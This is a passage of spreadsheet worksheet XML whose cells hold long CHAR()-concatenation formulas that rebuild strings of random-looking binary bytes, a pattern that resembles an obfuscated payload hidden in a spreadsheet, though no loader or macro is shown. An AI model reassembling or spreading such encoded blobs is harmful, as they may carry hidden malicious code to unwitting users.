R(21)&amp;CHAR(46)&amp;CHAR(127)&amp;CHAR(142)&amp;CHAR(31)&amp;CHAR(249)&amp;CHAR(245)&amp;CHAR(95)&amp;CHAR(113)&amp;CHAR(74)&amp;CHAR(203)&amp;CHAR(110)&amp;CHAR(234)&amp;CHAR(76)&amp;CHAR(189)&amp;CHAR(231)&amp;CHAR(88)&amp;CHAR(50)&amp;CHAR(83)&amp;CHAR(93)&amp;CHAR(20)&amp;CHAR(238)&amp;CHAR(113)&amp;CHAR(21)&amp;CHAR(5)&amp;CHAR(115)&amp;CHAR(140)&amp;CHAR(1)&amp;CHAR(94)&amp;CHAR(78)&amp;CHAR(223)&amp;CHAR(47)&amp;CHAR(177)&amp;CHAR(62)&amp;CHAR(23)&amp;CHAR(177)&amp;CHAR(226)&amp;CHAR(237)&amp;CHAR(145)&amp;CHAR(129)&amp;CHAR(191)&amp;CHAR(214)&amp;CHAR(112)&amp;CHAR(84)&amp;CHAR(101)&amp;CHAR(209)&amp;CHAR(151)&amp;CHAR(173)&amp;CHAR(76)&amp;CHAR(76)&amp;CHAR(42)&amp;CHAR(252)&amp;CHAR(92)&amp;CHAR(83)&amp;CHAR(152)&amp;CHAR(29)&amp;CHAR(3)&amp;CHAR(103)&amp;CHAR(193)&amp;CHAR(39)&amp;CHAR(184)&amp;CHAR(195)&amp;CHAR(86)&amp;CHAR(214)&amp;CHAR(142)&amp;CHAR(82)&amp;CHAR(176)&amp;CHAR(4)&amp;CHAR(75)&amp;CHAR(147)&amp;CHAR(126)&amp;CHAR(160)&amp;CHAR(249)&amp;CHAR(132)&amp;CHAR(74)&amp;CHAR(179)&amp;CHAR(88)&amp;CHAR(27)&amp;CHAR(87)&amp;CHAR(134)&amp;CHAR(44)&amp;CHAR(96)&amp;CHAR(104)&amp;CHAR(75)&amp;CHAR(29)&amp;CHAR(255)&amp;CHAR(54)&amp;CHAR(251)&amp;CHAR(27)&amp;CHAR(29)&amp;CHAR(213)&amp;CHAR(99)&amp;CHAR(242)&amp;CHAR(167)&amp;CHAR(167)&amp;CHAR(70)&amp;CHAR(233)&amp;CHAR(215)&amp;CHAR(147)&amp;CHAR(10)&amp;CHAR(171)&amp;CHAR(134)&amp;CHAR(192)&amp;CHAR(58)&amp;CHAR(66)&amp;CHAR(232)&amp;CHAR(123)&amp;CHAR(198)&amp;CHAR(186)&amp;CHAR(251)&amp;CHAR(130)&amp;CHAR(70)&amp;CHAR(202)&amp;CHAR(184)&amp;CHAR(117)&amp;CHAR(44)&amp;CHAR(194)&amp;CHAR(134)&amp;CHAR(32)&amp;CHAR(194)&amp;CHAR(196)&amp;CHAR(81)&amp;CHAR(134)&amp;CHAR(141)&amp;CHAR(96)&amp;CHAR(211)&amp;CHAR(81)&amp;CHAR(38)&amp;CHAR(197)&amp;CHAR(55)&amp;CHAR(237)&amp;CHAR(214)&amp;CHAR(111)&amp;CHAR(81)&amp;CHAR(93)&amp;CHAR(228)&amp;CHAR(191)&amp;CHAR(21)&amp;CHAR(118)&amp;CHAR(142)&amp;CHAR(234)&amp;CHAR(228)&amp;CHAR(82)&amp;CHAR(220)&amp;CHAR(199)&amp;CHAR(167)&amp;CHAR(141)&amp;CHAR(131)&amp;CHAR(163)&amp;CHAR(122)&amp;CHAR(188)&amp;CHAR(14)&amp;CHAR(204)&amp;CHAR(11)&amp;CHAR(126)&amp;CHAR(232)&amp;CHAR(252)&amp;CHAR(193)&amp;CHAR(117)&amp;CHAR(197)&amp;CHAR(152)&amp;CHAR(96)</f>
        <v>åìÉSÎi¶Kq‘6ï½´M£ÉæéjTXq&lt;'Y(Añ®Ø_x001D_ _x0019_:ú„¦z_x0017_»É‹ÐF_x001B_6"ÿn_x0012_­š*–ŽÐ1Ïƒ4÷»G»‘
_x0015_¬¬=øºÜ¹ì-_x000B_Ó_õfÚóì0›_x0010_õvÍÕ_x0015_.Ž_x001F_ùõ_qJËnêL½çX2S]_x0014_îq_x0015__x0005_sŒ_x0001_^Nß/±&gt;_x0017_±âí‘¿ÖpTeÑ—­LL*ü\S˜_x001D__x0003_gÁ'¸ÃVÖŽR°_x0004_K“~ ù„J³X_x001B_W†,`hK_x001D_ÿ6û_x001B__x001D_Õcò§§Fé×“
«†À:Bè{Æºû‚FÊ¸u,Â† ÂÄQ†`ÓQ&amp;Å7íÖoQ]ä¿_x0015_vŽêäRÜÇ§ƒ£z¼_x000E_Ì_x000B_~èüÁuÅ˜`</v>
      </c>
      <c r="C57" t="str">
        <f>CHAR(140)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(19)&amp;CHAR(53)&amp;CHAR(225)&amp;CHAR(194)&amp;CHAR(126)&amp;CHAR(136)&amp;CHAR(234)</f>
        <v>Œê‘_x0013_5áÂ~ˆê</v>
      </c>
    </row>
    <row r="58" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B58" t="str">
        <f>CHAR(15)&amp;CHAR(113)&amp;CHAR(249)&amp;CHAR(45)&amp;CHAR(148)&amp;CHAR(103)&amp;CHAR(153)&amp;CHAR(163)&amp;CHAR(66)&amp;CHAR(201)&amp;CHAR(156)&amp;CHAR(46)&amp;CHAR(230)&amp;CHAR(146)&amp;CHAR(151)&amp;CHAR(34)&amp;CHAR(233)&amp;CHAR(253)&amp;CHAR(188)&amp;CHAR(222)&amp;CHAR(148)&amp;CHAR(175)&amp;CHAR(221)&amp;CHAR(228)&amp;CHAR(232)&amp;CHAR(147)&amp;CHAR(140)&amp;CHAR(89)&amp;CHAR(171)&amp;CHAR(26)&amp;CHAR(39)&amp;CHAR(212)&amp;CHAR(20)&amp;CHAR(248)&amp;CHAR(200)&amp;CHAR(214)&amp;CHAR(254)&amp;CHAR(162)&amp;CHAR(109)&amp;CHAR(214)&amp;CHAR(136)&amp;CHAR(186)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(108)&amp;CHAR(142)&amp;CHAR(37)&amp;CHAR(188)&amp;CHAR(236)&amp;CHAR(207)&amp;CHAR(178)&amp;CHAR(235)&amp;CHAR(150)&amp;CHAR(180)&amp;CHAR(195)&amp;CHAR(209)&amp;CHAR(232)&amp;CHAR(200)&amp;CHAR(168)&amp;CHAR(210)&amp;CHAR(189)&amp;CHAR(103)&amp;CHAR(243)&amp;CHAR(25)&amp;CHAR(2)&amp;CHAR(33)&amp;CHAR(123)&amp;CHAR(250)&amp;CHAR(15)&amp;CHAR(245)&amp;CHAR(197)&amp;CHAR(147)&amp;CHAR(123)&amp;CHAR(134)&amp;CHAR(103)&amp;CHAR(203)&amp;CHAR(53)&amp;CHAR(195)&amp;CHAR(210)&amp;CHAR(66)&amp;CHAR(27)&amp;CHAR(131)&amp;CHAR(44)&amp;CHAR(170)&amp;CHAR(53)&amp;CHAR(121)&amp;CHAR(16)&amp;CHAR(82)&amp;CHAR(29)&amp;CHAR(152)&amp;CHAR(119)&amp;CHAR(252)&amp;CHAR(160)&amp;CHAR(223)&amp;CHAR(161)&amp;CHAR(133)&amp;CHAR(211)&amp;CHAR(96)&amp;CHAR(190)&amp;CHAR(59)&amp;CHAR(139)&amp;CHAR(140)&amp;CHAR(95)&amp;CHAR(157)&amp;CHAR(209)&amp;CHAR(97)&amp;CHAR(173)&amp;CHAR(138)&amp;CHAR(150)&amp;CHAR(235)&amp;CHAR(140)&amp;CHAR(144)&amp;CHAR(248)&amp;CHAR(192)&amp;CHAR(107)&amp;CHAR(20)&amp;CHAR(1)&amp;CHAR(200)&amp;CHAR(195)&amp;CHAR(40)&amp;CHAR(98)&amp;CHAR(103)&amp;CHAR(126)&amp;CHAR(97)&amp;CHAR(30)&amp;CHAR(118)&amp;CHAR(27)&amp;CHAR(12)&amp;CHAR(198)&amp;CHAR(115)&amp;CHAR(175)&amp;CHAR(135)&amp;CHAR(155)&amp;CHAR(151)&amp;CHAR(31)&amp;CHAR(170)&amp;CHAR(36)&amp;CHAR(124)&amp;CHAR(62)&amp;CHAR(65)&amp;CHAR(129)&amp;CHAR(132)&amp;CHAR(127)&amp;CHAR(190)&amp;CHAR(100)&amp;CHAR(23)&amp;CHAR(240)&amp;CHAR(176)&amp;CHAR(54)&amp;CHAR(103)&amp;CHAR(30)&amp;CHAR(182)&amp;CHAR(5)&amp;CHAR(171)&amp;CHAR(1)&amp;CHAR(90)&amp;CHAR(213)&amp;CHAR(60)&amp;CHAR(234)&amp;CHAR(158)&amp;CHAR(75)&amp;CHAR(182)&amp;CHAR(213)&amp;CHAR(195)&amp;CHAR(92)&amp;CHAR(183)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(243)&amp;CHAR(142)&amp;CHAR(175)&amp;CHAR(89)&amp;CHAR(98)&amp;CHAR(164)&amp;CHAR(137)&amp;CHAR(183)&amp;CHAR(219)&amp;CHAR(40)&amp;CHAR(204)&amp;CHAR(4)&amp;CHAR(102)&amp;CHAR(134)&amp;CHAR(174)&amp;CHAR(31)&amp;CHAR(108)&amp;CHAR(14)&amp;CHAR(190)&amp;CHAR(140)&amp;CHAR(206)&amp;CHAR(49)&amp;CHAR(118)&amp;CHAR(220)&amp;CHAR(83)&amp;CHAR(78)&amp;CHAR(143)&amp;CHAR(204)&amp;CHAR(59)&amp;CHAR(28)&amp;CHAR(244)&amp;CHAR(11)&amp;CHAR(241)&amp;CHAR(87)&amp;CHAR(172)&amp;CHAR(2)&amp;CHAR(255)&amp;CHAR(169)&amp;CHAR(70)&amp;CHAR(219)&amp;CHAR(74)&amp;CHAR(251)&amp;CHAR(93)&amp;CHAR(95)&amp;CHAR(206)&amp;CHAR(102)&amp;CHAR(205)&amp;CHAR(29)&amp;CHAR(204)&amp;CHAR(165)&amp;CHAR(128)&amp;CHAR(154)&amp;CHAR(175)&amp;CHAR(76)&amp;CHAR(51)&amp;CHAR(55)&amp;CHAR(189)&amp;CHAR(74)&amp;CHAR(21)&amp;CHAR(123)&amp;CHAR(202)&amp;CHAR(120)&amp;CHAR(238)&amp;CHAR(34)&amp;CHAR(87)&amp;CHAR(20)&amp;CHAR(53)&amp;CHAR(152)&amp;CHAR(233)&amp;CHAR(206)&amp;CHAR(225)&amp;CHAR(138)&amp;CHAR(129)&amp;CHAR(93)&amp;CHAR(35)&amp;CHAR(72)&amp;CHAR(254)&amp;CHAR(152)&amp;CHAR(119)&amp;CHAR(103)&amp;CHAR(74)&amp;CHAR(141)&amp;CHAR(110)&amp;CHAR(215)&amp;CHAR(47)&amp;CHAR(166)&amp;CHAR(184)</f>
        <v>_x000F_qù-”g™£BÉœ.æ’—"éý¼Þ”¯Ýäè“ŒY«_x001A_'Ô_x0014_øÈÖþ¢mÖˆº_x0001__x0001_lŽ%¼ìÏ²ë–´ÃÑèÈ¨Ò½gó_x0019__x0002_!{ú_x000F_õÅ“{†gË5ÃÒB_x001B_ƒ,ª5y_x0010_R_x001D_˜wü ß¡…Ó`¾;‹Œ_Ña­Š–ëŒøÀk_x0014__x0001_ÈÃ(bg~a_x001E_v_x001B__x000C_Æs¯‡›—_x001F_ª$|&gt;A„¾d_x0017_ð°6g_x001E_¶_x0005_«_x0001_ZÕ&lt;êžK¶ÕÃ\·_x000F__x000B_óŽ¯Yb¤‰·Û(Ì_x0004_f†®_x001F_l_x000E_¾ŒÎ1vÜSNÌ;_x001C_ô_x000B_ñW¬_x0002_ÿ©FÛJû]_ÎfÍ_x001D_Ì¥€š¯L37½J_x0015_{Êxî"W_x0014_5˜éÎáŠ]#Hþ˜wgJn×/¦¸</v>
      </c>
      <c r="C58" t="str">
        <f>CHAR(244)&amp;CHAR(19)&amp;CHAR(51)&amp;CHAR(248)&amp;CHAR(84)&amp;CHAR(82)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(19)</f>
        <v>ô_x0013_3øTRˆê‘_x0013_</v>
      </c>
    </row>
    <row r="59" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B59" t="str">
        <f>CHAR(9)&amp;CHAR(1)&amp;CHAR(82)&amp;CHAR(175)&amp;CHAR(1)&amp;CHAR(104)&amp;CHAR(182)&amp;CHAR(199)&amp;CHAR(171)&amp;CHAR(152)&amp;CHAR(9)&amp;CHAR(178)&amp;CHAR(232)&amp;CHAR(220)&amp;CHAR(92)&amp;CHAR(178)&amp;CHAR(195)&amp;CHAR(150)&amp;CHAR(244)&amp;CHAR(62)&amp;CHAR(159)&amp;CHAR(152)&amp;CHAR(65)&amp;CHAR(143)&amp;CHAR(34)&amp;CHAR(255)&amp;CHAR(122)&amp;CHAR(202)&amp;CHAR(211)&amp;CHAR(50)&amp;CHAR(248)&amp;CHAR(171)&amp;CHAR(227)&amp;CHAR(103)&amp;CHAR(224)&amp;CHAR(9)&amp;CHAR(112)&amp;CHAR(187)&amp;CHAR(99)&amp;CHAR(110)&amp;CHAR(119)&amp;CHAR(23)&amp;CHAR(90)&amp;CHAR(221)&amp;CHAR(142)&amp;CHAR(128)&amp;CHAR(221)&amp;CHAR(148)&amp;CHAR(231)&amp;CHAR(243)&amp;CHAR(223)&amp;CHAR(191)&amp;CHAR(249)&amp;CHAR(15)&amp;CHAR(80)&amp;CHAR(19)&amp;CHAR(124)&amp;CHAR(144)&amp;CHAR(217)&amp;CHAR(81)&amp;CHAR(115)&amp;CHAR(104)&amp;CHAR(236)&amp;CHAR(8)&amp;CHAR(129)&amp;CHAR(205)&amp;CHAR(56)&amp;CHAR(159)&amp;CHAR(202)&amp;CHAR(242)&amp;CHAR(120)&amp;CHAR(120)&amp;CHAR(83)&amp;CHAR(9)&amp;CHAR(134)&amp;CHAR(170)&amp;CHAR(72)&amp;CHAR(54)&amp;CHAR(9)&amp;CHAR(131)&amp;CHAR(206)&amp;CHAR(234)&amp;CHAR(231)&amp;CHAR(114)&amp;CHAR(8)&amp;CHAR(1)&amp;CHAR(168)&amp;CHAR(35)&amp;CHAR(130)&amp;CHAR(177)&amp;CHAR(52)&amp;CHAR(36)&amp;CHAR(68)&amp;CHAR(35)&amp;CHAR(65)&amp;CHAR(154)&amp;CHAR(136)&amp;CHAR(185)&amp;CHAR(146)&amp;CHAR(8)&amp;CHAR(198)&amp;CHAR(175)&amp;CHAR(60)&amp;CHAR(110)&amp;CHAR(157)&amp;CHAR(228)&amp;CHAR(184)&amp;CHAR(69)&amp;CHAR(195)&amp;CHAR(173)&amp;CHAR(54)&amp;CHAR(96)&amp;CHAR(242)&amp;CHAR(112)&amp;CHAR(223)&amp;CHAR(46)&amp;CHAR(133)&amp;CHAR(54)&amp;CHAR(72)&amp;CHAR(207)&amp;CHAR(253)&amp;CHAR(204)&amp;CHAR(35)&amp;CHAR(110)&amp;CHAR(172)&amp;CHAR(109)&amp;CHAR(72)&amp;CHAR(141)&amp;CHAR(90)&amp;CHAR(29)&amp;CHAR(123)&amp;CHAR(44)&amp;CHAR(236)&amp;CHAR(126)&amp;CHAR(164)&amp;CHAR(16)&amp;CHAR(164)&amp;CHAR(102)&amp;CHAR(170)&amp;CHAR(237)&amp;CHAR(216)&amp;CHAR(148)&amp;CHAR(2)&amp;CHAR(65)&amp;CHAR(227)&amp;CHAR(243)&amp;CHAR(21)&amp;CHAR(162)&amp;CHAR(108)&amp;CHAR(165)&amp;CHAR(13)&amp;CHAR(99)&amp;CHAR(180)&amp;CHAR(146)&amp;CHAR(228)&amp;CHAR(50)&amp;CHAR(10)&amp;CHAR(190)&amp;CHAR(1)&amp;CHAR(129)&amp;CHAR(87)&amp;CHAR(73)&amp;CHAR(157)&amp;CHAR(98)&amp;CHAR(117)&amp;CHAR(199)&amp;CHAR(93)&amp;CHAR(73)&amp;CHAR(68)&amp;CHAR(236)&amp;CHAR(178)&amp;CHAR(217)&amp;CHAR(198)&amp;CHAR(1)&amp;CHAR(42)&amp;CHAR(84)&amp;CHAR(229)&amp;CHAR(54)&amp;CHAR(241)&amp;CHAR(201)&amp;CHAR(123)&amp;CHAR(132)&amp;CHAR(28)&amp;CHAR(188)&amp;CHAR(152)&amp;CHAR(112)&amp;CHAR(243)&amp;CHAR(3)&amp;CHAR(153)&amp;CHAR(147)&amp;CHAR(81)&amp;CHAR(214)&amp;CHAR(201)&amp;CHAR(100)&amp;CHAR(84)&amp;CHAR(206)&amp;CHAR(213)&amp;CHAR(83)&amp;CHAR(10)&amp;CHAR(224)&amp;CHAR(86)&amp;CHAR(4)&amp;CHAR(127)&amp;CHAR(239)&amp;CHAR(182)&amp;CHAR(55)&amp;CHAR(195)&amp;CHAR(165)&amp;CHAR(245)&amp;CHAR(201)&amp;CHAR(93)&amp;CHAR(10)&amp;CHAR(29)&amp;CHAR(122)&amp;CHAR(247)&amp;CHAR(201)&amp;CHAR(35)&amp;CHAR(129)&amp;CHAR(140)&amp;CHAR(191)&amp;CHAR(202)&amp;CHAR(153)&amp;CHAR(192)&amp;CHAR(185)&amp;CHAR(148)&amp;CHAR(127)&amp;CHAR(186)&amp;CHAR(33)&amp;CHAR(206)&amp;CHAR(144)&amp;CHAR(8)&amp;CHAR(101)&amp;CHAR(80)&amp;CHAR(125)&amp;CHAR(77)&amp;CHAR(167)&amp;CHAR(209)&amp;CHAR(12)&amp;CHAR(103)&amp;CHAR(76)&amp;CHAR(63)&amp;CHAR(110)&amp;CHAR(14)&amp;CHAR(160)&amp;CHAR(37)&amp;CHAR(55)&amp;CHAR(250)&amp;CHAR(146)&amp;CHAR(247)&amp;CHAR(122)&amp;CHAR(105)&amp;CHAR(144)&amp;CHAR(54)&amp;CHAR(214)&amp;CHAR(87)</f>
        <v xml:space="preserve">	_x0001_R¯_x0001_h¶Ç«˜	²èÜ\²Ã–ô&gt;Ÿ˜A"ÿzÊÓ2ø«ãgà	p»cnw_x0017_ZÝŽ€Ý”çóß¿ù_x000F_P_x0013_|ÙQshì_x0008_Í8ŸÊòxxS	†ªH6	ƒÎêçr_x0008__x0001_¨#‚±4$D#Ašˆ¹’_x0008_Æ¯&lt;nä¸EÃ­6`òpß.…6HÏýÌ#n¬mHZ_x001D_{,ì~¤_x0010_¤fªíØ”_x0002_Aãó_x0015_¢l¥_x000D_c´’ä2
¾_x0001_WIbuÇ]IDì²ÙÆ_x0001_*Tå6ñÉ{„_x001C_¼˜pó_x0003_™“QÖÉdTÎÕS
àV_x0004_ï¶7Ã¥õÉ]
_x001D_z÷É#Œ¿Ê™À¹”º!Î_x0008_eP}M§Ñ_x000C_gL?n_x000E_ %7ú’÷zi6ÖW</v>
      </c>
      <c r="C59" t="str">
        <f>CHAR(59)&amp;CHAR(53)&amp;CHAR(41)&amp;CHAR(50)&amp;CHAR(3)&amp;CHAR(227)&amp;CHAR(110)&amp;CHAR(11)&amp;CHAR(240)&amp;CHAR(113)</f>
        <v>;5)2_x0003_ãn_x000B_ðq</v>
      </c>
    </row>
    <row r="60" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B60" t="str">
        <f>CHAR(208)&amp;CHAR(248)&amp;CHAR(117)&amp;CHAR(72)&amp;CHAR(245)&amp;CHAR(236)&amp;CHAR(134)&amp;CHAR(238)&amp;CHAR(33)&amp;CHAR(62)&amp;CHAR(135)&amp;CHAR(35)&amp;CHAR(237)&amp;CHAR(200)&amp;CHAR(242)&amp;CHAR(41)&amp;CHAR(19)&amp;CHAR(125)&amp;CHAR(239)&amp;CHAR(255)&amp;CHAR(2)&amp;CHAR(194)&amp;CHAR(60)&amp;CHAR(83)&amp;CHAR(159)&amp;CHAR(26)&amp;CHAR(204)&amp;CHAR(98)&amp;CHAR(113)&amp;CHAR(253)&amp;CHAR(131)&amp;CHAR(248)&amp;CHAR(34)&amp;CHAR(84)&amp;CHAR(172)&amp;CHAR(222)&amp;CHAR(128)&amp;CHAR(196)&amp;CHAR(184)&amp;CHAR(11)&amp;CHAR(200)&amp;CHAR(253)&amp;CHAR(208)&amp;CHAR(35)&amp;CHAR(72)&amp;CHAR(123)&amp;CHAR(113)&amp;CHAR(249)&amp;CHAR(196)&amp;CHAR(201)&amp;CHAR(229)&amp;CHAR(223)&amp;CHAR(177)&amp;CHAR(38)&amp;CHAR(137)&amp;CHAR(99)&amp;CHAR(236)&amp;CHAR(80)&amp;CHAR(228)&amp;CHAR(11)&amp;CHAR(42)&amp;CHAR(36)&amp;CHAR(87)&amp;CHAR(178)&amp;CHAR(52)&amp;CHAR(212)&amp;CHAR(109)&amp;CHAR(248)&amp;CHAR(237)&amp;CHAR(220)&amp;CHAR(52)&amp;CHAR(98)&amp;CHAR(1)&amp;CHAR(20)&amp;CHAR(115)&amp;CHAR(202)&amp;CHAR(206)&amp;CHAR(97)&amp;CHAR(152)&amp;CHAR(216)&amp;CHAR(191)&amp;CHAR(81)&amp;CHAR(240)&amp;CHAR(98)&amp;CHAR(222)&amp;CHAR(87)&amp;CHAR(161)&amp;CHAR(241)&amp;CHAR(220)&amp;CHAR(146)&amp;CHAR(13)&amp;CHAR(122)&amp;CHAR(16)&amp;CHAR(197)&amp;CHAR(190)&amp;CHAR(82)&amp;CHAR(13)&amp;CHAR(128)&amp;CHAR(154)&amp;CHAR(204)&amp;CHAR(62)&amp;CHAR(191)&amp;CHAR(66)&amp;CHAR(240)&amp;CHAR(199)&amp;CHAR(140)&amp;CHAR(186)&amp;CHAR(34)&amp;CHAR(30)&amp;CHAR(190)&amp;CHAR(230)&amp;CHAR(3)&amp;CHAR(43)&amp;CHAR(191)&amp;CHAR(84)&amp;CHAR(104)&amp;CHAR(199)&amp;CHAR(34)&amp;CHAR(129)&amp;CHAR(80)&amp;CHAR(96)&amp;CHAR(28)&amp;CHAR(18)&amp;CHAR(128)&amp;CHAR(83)&amp;CHAR(52)&amp;CHAR(4)&amp;CHAR(38)&amp;CHAR(122)&amp;CHAR(109)&amp;CHAR(86)&amp;CHAR(85)&amp;CHAR(214)&amp;CHAR(202)&amp;CHAR(44)&amp;CHAR(125)&amp;CHAR(63)&amp;CHAR(224)&amp;CHAR(26)&amp;CHAR(140)&amp;CHAR(55)&amp;CHAR(104)&amp;CHAR(127)&amp;CHAR(67)&amp;CHAR(216)&amp;CHAR(198)&amp;CHAR(147)&amp;CHAR(129)&amp;CHAR(237)&amp;CHAR(127)&amp;CHAR(30)&amp;CHAR(191)&amp;CHAR(185)&amp;CHAR(15)&amp;CHAR(133)&amp;CHAR(133)&amp;CHAR(98)&amp;CHAR(217)&amp;CHAR(209)&amp;CHAR(252)&amp;CHAR(221)&amp;CHAR(146)&amp;CHAR(70)&amp;CHAR(74)&amp;CHAR(134)&amp;CHAR(130)&amp;CHAR(236)&amp;CHAR(60)&amp;CHAR(130)&amp;CHAR(75)&amp;CHAR(184)&amp;CHAR(102)&amp;CHAR(96)&amp;CHAR(64)&amp;CHAR(208)&amp;CHAR(114)&amp;CHAR(149)&amp;CHAR(135)&amp;CHAR(106)&amp;CHAR(42)&amp;CHAR(58)&amp;CHAR(102)&amp;CHAR(84)&amp;CHAR(221)&amp;CHAR(236)&amp;CHAR(136)&amp;CHAR(188)&amp;CHAR(94)&amp;CHAR(78)&amp;CHAR(220)&amp;CHAR(112)&amp;CHAR(175)&amp;CHAR(72)&amp;CHAR(137)&amp;CHAR(219)&amp;CHAR(34)&amp;CHAR(135)&amp;CHAR(24)&amp;CHAR(214)&amp;CHAR(118)&amp;CHAR(231)&amp;CHAR(51)&amp;CHAR(44)&amp;CHAR(21)&amp;CHAR(108)&amp;CHAR(19)&amp;CHAR(58)&amp;CHAR(188)&amp;CHAR(241)&amp;CHAR(210)&amp;CHAR(253)&amp;CHAR(168)&amp;CHAR(71)&amp;CHAR(162)&amp;CHAR(6)&amp;CHAR(11)&amp;CHAR(128)&amp;CHAR(156)&amp;CHAR(233)&amp;CHAR(216)&amp;CHAR(81)&amp;CHAR(83)&amp;CHAR(139)&amp;CHAR(241)&amp;CHAR(14)&amp;CHAR(68)&amp;CHAR(197)&amp;CHAR(207)&amp;CHAR(81)&amp;CHAR(182)&amp;CHAR(159)&amp;CHAR(246)&amp;CHAR(76)&amp;CHAR(230)&amp;CHAR(126)&amp;CHAR(182)&amp;CHAR(138)&amp;CHAR(160)&amp;CHAR(109)&amp;CHAR(58)&amp;CHAR(76)&amp;CHAR(208)&amp;CHAR(39)&amp;CHAR(26)&amp;CHAR(71)&amp;CHAR(50)&amp;CHAR(190)&amp;CHAR(252)&amp;CHAR(131)&amp;CHAR(192)&amp;CHAR(17)&amp;CHAR(202)&amp;CHAR(30)&amp;CHAR(209)&amp;CHAR(71)</f>
        <v>ÐøuHõì†î!&gt;‡#íÈò)_x0013_}ïÿ_x0002_Â&lt;SŸ_x001A_Ìbqýƒø"T¬Þ€Ä¸_x000B_ÈýÐ#H{qùÄÉåß±&amp;‰cìPä_x000B_*$W²4ÔmøíÜ4b_x0001__x0014_sÊÎa˜Ø¿QðbÞW¡ñÜ’_x000D_z_x0010_Å¾R_x000D_€šÌ&gt;¿BðÇŒº"_x001E_¾æ_x0003_+¿ThÇ"P`_x001C__x0012_€S4_x0004_&amp;zmVUÖÊ,}?à_x001A_Œ7hCØÆ“í_x001E_¿¹_x000F_……bÙÑüÝ’FJ†‚ì&lt;‚K¸f`@Ðr•‡j*:fTÝìˆ¼^NÜp¯H‰Û"‡_x0018_Övç3,_x0015_l_x0013_:¼ñÒý¨G¢_x0006__x000B_€œéØQS‹ñ_x000E_DÅÏQ¶ŸöLæ~¶Š m:LÐ'_x001A_G2¾üƒÀ_x0011_Ê_x001E_ÑG</v>
      </c>
      <c r="C60" t="str">
        <f>CHAR(177)&amp;CHAR(117)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(147)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(145)&amp;CHAR(57)&amp;CHAR(241)</f>
        <v>±u_x000D__x0006_“[¸‘9ñ</v>
      </c>
    </row>
    <row r="61" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B61" t="str">
        <f>CHAR(28)&amp;CHAR(19)&amp;CHAR(62)&amp;CHAR(91)&amp;CHAR(28)&amp;CHAR(110)&amp;CHAR(252)&amp;CHAR(17)&amp;CHAR(72)&amp;CHAR(83)&amp;CHAR(19)&amp;CHAR(132)&amp;CHAR(100)&amp;CHAR(46)&amp;CHAR(246)&amp;CHAR(118)&amp;CHAR(141)&amp;CHAR(50)&amp;CHAR(88)&amp;CHAR(164)&amp;CHAR(206)&amp;CHAR(15)&amp;CHAR(159)&amp;CHAR(10)&amp;CHAR(4)&amp;CHAR(221)&amp;CHAR(70)&amp;CHAR(87)&amp;CHAR(128)&amp;CHAR(83)&amp;CHAR(182)&amp;CHAR(240)&amp;CHAR(100)&amp;CHAR(162)&amp;CHAR(66)&amp;CHAR(236)&amp;CHAR(222)&amp;CHAR(93)&amp;CHAR(218)&amp;CHAR(232)&amp;CHAR(255)&amp;CHAR(180)&amp;CHAR(149)&amp;CHAR(103)&amp;CHAR(56)&amp;CHAR(127)&amp;CHAR(201)&amp;CHAR(227)&amp;CHAR(91)&amp;CHAR(238)&amp;CHAR(241)&amp;CHAR(230)&amp;CHAR(241)&amp;CHAR(101)&amp;CHAR(204)&amp;CHAR(247)&amp;CHAR(196)&amp;CHAR(222)&amp;CHAR(42)&amp;CHAR(169)&amp;CHAR(171)&amp;CHAR(236)&amp;CHAR(227)&amp;CHAR(53)&amp;CHAR(121)&amp;CHAR(92)&amp;CHAR(149)&amp;CHAR(205)&amp;CHAR(163)&amp;CHAR(226)&amp;CHAR(165)&amp;CHAR(59)&amp;CHAR(167)&amp;CHAR(57)&amp;CHAR(241)&amp;CHAR(175)&amp;CHAR(31)&amp;CHAR(154)&amp;CHAR(169)&amp;CHAR(8)&amp;CHAR(140)&amp;CHAR(251)&amp;CHAR(210)&amp;CHAR(197)&amp;CHAR(127)&amp;CHAR(21)&amp;CHAR(23)&amp;CHAR(235)&amp;CHAR(173)&amp;CHAR(16)&amp;CHAR(155)&amp;CHAR(182)&amp;CHAR(212)&amp;CHAR(195)&amp;CHAR(200)&amp;CHAR(24)&amp;CHAR(18)&amp;CHAR(32)&amp;CHAR(110)&amp;CHAR(102)&amp;CHAR(132)&amp;CHAR(3)&amp;CHAR(182)&amp;CHAR(171)&amp;CHAR(46)&amp;CHAR(35)&amp;CHAR(67)&amp;CHAR(139)&amp;CHAR(90)&amp;CHAR(201)&amp;CHAR(21)&amp;CHAR(192)&amp;CHAR(67)&amp;CHAR(243)&amp;CHAR(123)&amp;CHAR(101)&amp;CHAR(26)&amp;CHAR(23)&amp;CHAR(38)&amp;CHAR(181)&amp;CHAR(84)&amp;CHAR(233)&amp;CHAR(49)&amp;CHAR(19)&amp;CHAR(116)&amp;CHAR(45)&amp;CHAR(27)&amp;CHAR(189)&amp;CHAR(95)&amp;CHAR(13)&amp;CHAR(100)&amp;CHAR(12)&amp;CHAR(203)&amp;CHAR(253)&amp;CHAR(7)&amp;CHAR(90)&amp;CHAR(86)&amp;CHAR(68)&amp;CHAR(94)&amp;CHAR(77)&amp;CHAR(197)&amp;CHAR(156)&amp;CHAR(200)&amp;CHAR(215)&amp;CHAR(206)&amp;CHAR(170)&amp;CHAR(54)&amp;CHAR(238)&amp;CHAR(145)&amp;CHAR(214)&amp;CHAR(152)&amp;CHAR(196)&amp;CHAR(158)&amp;CHAR(244)&amp;CHAR(157)&amp;CHAR(129)&amp;CHAR(172)&amp;CHAR(246)&amp;CHAR(107)&amp;CHAR(103)&amp;CHAR(103)&amp;CHAR(67)&amp;CHAR(133)&amp;CHAR(150)&amp;CHAR(248)&amp;CHAR(110)&amp;CHAR(49)&amp;CHAR(159)&amp;CHAR(234)&amp;CHAR(42)&amp;CHAR(19)&amp;CHAR(234)&amp;CHAR(83)&amp;CHAR(228)&amp;CHAR(206)&amp;CHAR(104)&amp;CHAR(178)&amp;CHAR(54)&amp;CHAR(48)&amp;CHAR(80)&amp;CHAR(229)&amp;C